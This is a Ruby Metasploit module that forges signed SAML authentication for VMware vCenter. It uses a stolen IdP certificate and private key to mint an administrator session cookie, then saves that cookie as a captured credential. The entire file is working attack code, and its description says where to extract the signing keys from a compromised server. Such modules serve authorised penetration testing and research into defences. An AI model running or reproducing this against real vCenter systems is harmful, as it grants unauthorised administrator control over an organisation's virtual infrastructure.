##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::WmapScanUniqueQuery
  include Msf::Exploit::Remote::HttpClient

  NS_MAP = {
    'c14n' => 'http://www.w3.org/2001/10/xml-exc-c14n#',
    'ds' => 'http://www.w3.org/2000/09/xmldsig#',
    'saml2' => 'urn:oasis:names:tc:SAML:2.0:assertion',
    'saml2p' => 'urn:oasis:names:tc:SAML:2.0:protocol',
    'md' => 'urn:oasis:names:tc:SAML:2.0:metadata',
    'xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
    'xs' => 'http://www.w3.org/2001/XMLSchema'
  }.freeze

  PREFIX_LIST = 'xsd xsi'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VMware vCenter Forge SAML Authentication Credentials',
        'Description' => %q{
          This module forges valid SAML credentials for vCenter server
          using the vCenter SSO IdP certificate, IdP private key, and
          VMCA certificates as input objects; you must also  provide
          the vCenter SSO domain name and vCenter FQDN. The module will
          return a session cookie for the /ui path that grants access to
          the SSO domain as a vSphere administrator. The IdP trusted
          certificate chain can be retrieved using Metasploit post
          exploitation modules or extracted manually from
          /storage/db/vmware-vmdir/data.mdb using binwalk.
        },
        'Author' => 'npm[at]cesium137.io',
        'Platform' => [ 'linux' ],
        'DisclosureDate' => '2022-04-20',
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/']
        ],
        'Actions' => [
          [
            'Run',
            {
              'Description' => 'Generate vSphere session cookie'
            }
          ]
        ],
        'DefaultAction' => 'Run',
        'DefaultOptions' => {
          'USERNAME' => 'administrator',
          'DOMAIN' => 'vsphere.local',
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Privileged' => true
      )
    )

    register_options([
      OptString.new('USERNAME', [ true, 'The username to target using forged credentials', 'administrator' ]),
      OptString.new('DOMAIN', [true, 'The target vSphere SSO domain', 'vsphere.local']),
      OptString.new('VHOST', [true, 'DNS FQDN of the vCenter server']),
      OptPath.new('VC_IDP_CERT', [ true, 'Path to the vCenter IdP certificate' ]),
      OptPath.new('VC_IDP_KEY', [ true, 'Path to the vCenter IdP private key' ]),
      OptPath.new('VC_VMCA_CERT', [ true, 'Path to the vCenter VMCA certificate' ])
    ])

    register_advanced_options([
      OptInt.new('VC_IDP_TOKEN_BEFORE_SKEW', [ true, 'NOT_BEFORE seconds to subtract from current time, values 300 to 2592000', 2592000 ]),
      OptInt.new('VC_IDP_TOKEN_AFTER_SKEW', [ true, 'NOT_AFTER seconds to add to current time, values 300 to 2592000', 2592000 ])
    ])

    deregister_options('Proxies')
  end

  def username
    datastore['USERNAME']
  end

  def domain
    datastore['DOMAIN']
  end

  def vcenter_fqdn
    datastore['VHOST']
  end

  def vc_idp_cert
    datastore['VC_IDP_CERT']
  end

  def vc_idp_key
    datastore['VC_IDP_KEY']
  end

  def vc_vmca_cert
    datastore['VC_VMCA_CERT']
  end

  def vc_token_before_skew
    @vc_token_before_skew ||= datastore['VC_IDP_TOKEN_BEFORE_SKEW']
  end

  def vc_token_after_skew
    @vc_token_after_skew ||= datastore['VC_IDP_TOKEN_AFTER_SKEW']
  end

  def run
    cookie_jar.clear

    validate_domains
    validate_timestamps
    validate_idp_options

    print_status('HTTP GET => /ui/login ...')
    init_vsphere_login

    vprint_status('Create forged SAML assertion XML ...')
    unless (vsphere_saml_response = get_saml_response_template)
      fail_with(Msf::Exploit::Failure::Unknown, 'Unable to generate SAML response XML')
    end

    vprint_status('Sign forged SAML assertion with IdP key ...')
    unless (vsphere_saml_auth = sign_vcenter_saml(vsphere_saml_response))
      fail_with(Msf::Exploit::Failure::Unknown, 'Unable to sign SAML assertion')
    end

    print_status('HTTP POST => /ui/saml/websso/sso ...')
    unless (session_cookie = submit_vcenter_auth(vsphere_saml_auth))
      fail_with(Msf::Exploit::Failure::Unknown, 'Unable to acquire administrator session token')
    end

    print_good('Got valid administrator session token!')
    print_good("\t#{session_cookie}")
  end

  def validate_idp_options
    begin
      idp_cert_file = File.binread(vc_idp_cert)
      idp_key_file = File.binread(vc_idp_key)
      vmca_cert_file = File.binread(vc_vmca_cert)
    rescue StandardError => e
      print_error("File read failure: #{e.class} - #{e.message}")
      fail_with(Msf::Exploit::Failure::BadConfig, 'Error reading certificate files')
    end

    unless (ca = OpenSSL::X509::Certificate.new(vmca_cert_file))
      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid VMCA certificate: #{vc_vmca_cert.path}")
    end

    unless (pub = OpenSSL::X509::Certificate.new(idp_cert_file))
      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid IdP certificate: #{vc_idp_cert.path}")
    end

    unless (priv = OpenSSL::PKey::RSA.new(idp_key_file))
      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid IdP private key: #{vc_idp_key.path}")
    end

    unless pub.check_private_key(priv)
      fail_with(Msf::Exploit::Failure::BadConfig, 'Provided IdP public and private keys are not associated')
    end

    unless (pub.issuer.to_s == ca.subject.to_s)
      print_error("IdP issuer DN does not match provided VMCA subject DN!\n\t  IdP Issuer DN: #{pub.issuer}\n\tVMCA Subject DN: #{ca.subject}")
      fail_with(Msf::Exploit::Failure::BadConfig, 'Invalid IdP certificate chain')
    end

    unless pub.verify(ca.public_key)
      fail_with(Msf::Exploit::Failure::BadConfig, 'Provided IdP certificate does not chain to VMCA certificate')
    end

    print_good('Validated vCenter Single Sign-On IdP trusted certificate chain')

    @vcenter_saml_idp_cert = pub
    @vcenter_saml_idp_key = priv
    @vcenter_saml_ca_cert = ca
  end

  def init_vsphere_login
    res = send_request_cgi({
      'uri' => '/ui/login',
      'method' => 'GET'
    })

    unless res
      fail_with(Msf::Exploit::Failure::Unreachable, 'Could not reach SAML endpoint')
    end

    unless res.code == 302
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "#{rhost} - expected HTTP 302, got HTTP #{res.code}")
    end

    datastore['TARGETURI'] = res['location']
    uri = target_uri

    query = queryparse(uri.query || '')

    unless (vsphere_saml_request_query = CGI.unescape(query['SAMLRequest']))
      fail_with(Msf::Exploit::Failure::UnexpectedReply, 'SAMLRequest query parameter was not returned with HTTP GET')
    end

    if !query['RelayState'].nil?
      @vcenter_saml_relay_state = CGI.unescape(query['RelayState'])
      vprint_status("Response included RelayState: #{@vcenter_saml_relay_state}")
    end

    vsphere_saml_request_gz = Base64.strict_decode64(vsphere_saml_request_query)
    vsphere_saml_request = Zlib::Inflate.new(-Zlib::MAX_WBITS).inflate(vsphere_saml_request_gz)

    req = vsphere_saml_request.to_s
    doc = REXML::Document.new(req)

    @vcenter_saml_id = doc.root.attributes['ID'].strip
    @vcenter_saml_issue = doc.root.attributes['IssueInstant'].strip
    @vcenter_saml_user = username.strip
    @vcenter_saml_domain = domain.strip
    @vcenter_saml_response_id = SecureRandom.hex.strip
    @vcenter_saml_assert_id = SecureRandom.uuid.strip
    @vcenter_saml_idx_id = SecureRandom.hex.strip

    @vcenter_saml_not_before = (Time.now.utc - vc_token_before_skew).iso8601.strip
    @vcenter_saml_not_after = (Time.now.utc + vc_token_after_skew).iso8601.strip
  end

  def get_saml_response_template
    template_path = ::File.join(::Msf::Config.data_directory, 'auxiliary', 'vmware', 'vcenter_forge_saml_token', 'assert.xml.erb')
    template = ::File.binread(template_path)

    b = binding

    context = {
      vcenter_fqdn: vcenter_fqdn,
      vcenter_saml_id: @vcenter_saml_id,
      vcenter_saml_issue: @vcenter_saml_issue,
      vcenter_saml_user: username,
      vcenter_saml_domain: domain,
      vcenter_saml_response_id: @vcenter_saml_response_id,
      vcenter_saml_assert_id: @vcenter_saml_assert_id,
      vcenter_saml_idx_id: @vcenter_saml_idx_id,
      vcenter_saml_not_before: @vcenter_saml_not_before,
      vcenter_saml_not_after: @vcenter_saml_not_after
    }

    locals = context.collect { |k, _| "#{k} = context[#{k.inspect}]; " }
    b.eval(locals.join)
    body = b.eval(Erubi::Engine.new(template).src)

    body.to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
  end

  def sign_vcenter_saml(xml)
    xmldoc = Nokogiri::XML(xml) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    ds_element = REXML::Element.new('ds:Signature').add_namespace('ds', NS_MAP['ds'])
    ds_sig_element = ds_element.add_element('ds:SignedInfo')
    ds_sig_element.add_element('ds:CanonicalizationMethod', { 'Algorithm' => NS_MAP['c14n'] })
    ds_sig_element.add_element('ds:SignatureMethod', { 'Algorithm' => 'http://www.w3.org/2001/04/xmldsig-more#rsa-sha256' })
    ds_ref_element = ds_sig_element.add_element('ds:Reference', { 'URI' => "#_#{@vcenter_saml_assert_id}" })
    ds_tx_element = ds_ref_element.add_element('ds:Transforms')
    ds_tx_element.add_element('ds:Transform', { 'Algorithm' => 'http://www.w3.org/2000/09/xmldsig#enveloped-signature' })
    ds_c14_element = ds_tx_element.add_element('ds:Transform', { 'Algorithm' => NS_MAP['c14n'] })
    ds_c14_element.add_element('ec:InclusiveNamespaces', { 'xmlns:ec' => NS_MAP['c14n'], 'PrefixList' => PREFIX_LIST })
    ds_ref_element.add_element('ds:DigestMethod', { 'Algorithm' => 'http://www.w3.org/2001/04/xmlenc#sha256' })

    inclusive_namespaces = PREFIX_LIST.split(' ')
    dest_node = xmldoc.at_xpath('//saml2p:Response/saml2:Assertion', NS_MAP)
    canon_doc = dest_node.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0, inclusive_namespaces)

    digest_b64 = Base64.strict_encode64(OpenSSL::Digest::SHA256.digest(canon_doc))
    ds_ref_element.add_element('ds:DigestValue').text = digest_b64

    noko_sig_element = Nokogiri::XML(ds_element.to_s) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    noko_signed_info_element = noko_sig_element.at_xpath('//ds:Signature/ds:SignedInfo', NS_MAP)
    c14n_string = noko_signed_info_element.canonicalize(Nokogiri::XML::XML_C14N_EXCLUSIVE_1_0)

    signature = Base64.strict_encode64(@vcenter_saml_idp_key.sign('rsa-sha256', c14n_string))
    ds_element.add_element('ds:SignatureValue').text = signature

    key_info_element = ds_element.add_element('ds:KeyInfo')

    x509_element = key_info_element.add_element('ds:X509Data')
    x509_cert_element = x509_element.add_element('ds:X509Certificate')
    x509_cert_element.text = Base64.strict_encode64(@vcenter_saml_idp_cert.to_der)

    x509_element = key_info_element.add_element('ds:X509Data')
    x509_cert_element = x509_element.add_element('ds:X509Certificate')
    x509_cert_element.text = Base64.strict_encode64(@vcenter_saml_ca_cert.to_der)

    noko_signed_signature_element = Nokogiri::XML(ds_element.to_s) do |config|
      config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
    end

    xmldoc.at_xpath('//saml2:Assertion/saml2:Issuer', NS_MAP).add_next_sibling(noko_signed_signature_element.document.root.to_s)

    xmldoc.document.to_s.strip.gsub("\r\n", '').gsub("\n", '').gsub(/>\s*/, '>').gsub(/\s*</, '<')
  end

  def submit_vcenter_auth(xml)
    saml_response = Base64.strict_encode64(xml)

    if @vcenter_saml_relay_state
      res = send_request_cgi({
        'uri' => '/ui/saml/websso/sso',
        'method' => 'POST',
        'vars_post' => {
          'SAMLResponse' => saml_response,
          'RelayState' => @vcenter_saml_relay_state
        },
        'keep_cookies' => true
      })
    else
      res = send_request_cgi({
        'uri' => '/ui/saml/websso/sso',
        'method' => 'POST',
        'vars_post' => {
          'SAMLResponse' => saml_response
        },
        'keep_cookies' => true
      })
    end

    unless res
      fail_with(Msf::Exploit::Failure::Unreachable, "#{rhost} - could not reach SAML endpoint")
    end

    unless res.code == 302
      if res.body.to_s != ''
        res_html = Nokogiri::HTML(res.body.to_s)
        res_detail = res_html.at("//div[@class='error-message']").text.gsub('..', '.')
        if res_detail
          print_error("Response: #{res_detail}")
        else
          print_error("Unable to interpret response from vCenter. Raw response:\n#{res}")
        end
      end
      fail_with(Msf::Exploit::Failure::UnexpectedReply, "Expected HTTP 302, got HTTP #{res.code}")
    end

    cookie_jar.cookies.each do |c|
      print_status("Got cookie: #{c.name}=#{c.value}")
    end

    @vcenter_saml_token = res.get_cookies_parsed.values.select { |v| v.to_s.include?('JSESSIONID') }.first.first
    @vcenter_saml_path = res.get_cookies_parsed.values.select { |v| v.to_s.include?('Path') }.first.first

    extra_service_data = {
      origin_type: :service,
      realm_key: Metasploit::Model::Realm::Key::WILDCARD,
      realm_value: domain
    }.merge(service_details)

    store_valid_credential(user: "JSESSIONID (#{@vcenter_saml_path})", private: @vcenter_saml_token, service_data: extra_service_data)

    "JSESSIONID=#{@vcenter_saml_token}; Path=#{@vcenter_saml_path}"
  end

  def validate_domains
    unless validate_fqdn(vcenter_fqdn)
      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vCenter FQDN provided: #{vcenter_fqdn}")
    end

    unless validate_fqdn(domain)
      fail_with(Msf::Exploit::Failure::BadConfig, "Invalid vCenter SSO domain provided: #{domain}")
    end
  end

  def validate_timestamps
    unless (vc_token_before_skew >= 300) && (vc_token_after_skew >= 300)
      fail_with(Msf::Exploit::Failure::BadConfig, 'Advanced options NOT_BEFORE and NOT_AFTER time skew cannot be less than 300 seconds')
    end
    unless (vc_token_before_skew <= 2592000) && (vc_token_after_skew <= 2592000)
      fail_with(Msf::Exploit::Failure::BadConfig, 'Advanced options NOT_BEFORE and NOT_AFTER time skew cannot be greater than 2592000 seconds')
    end
  end

  def validate_fqdn(fqdn)
    fqdn_regex = /(?=^.{4,253}$)(^((?!-)[a-z0-9-]{0,62}[a-z0-9]\.)+[a-z]{2,63}$)/
    return true if fqdn_regex.match?(fqdn.to_s.downcase)

    false
  end
end
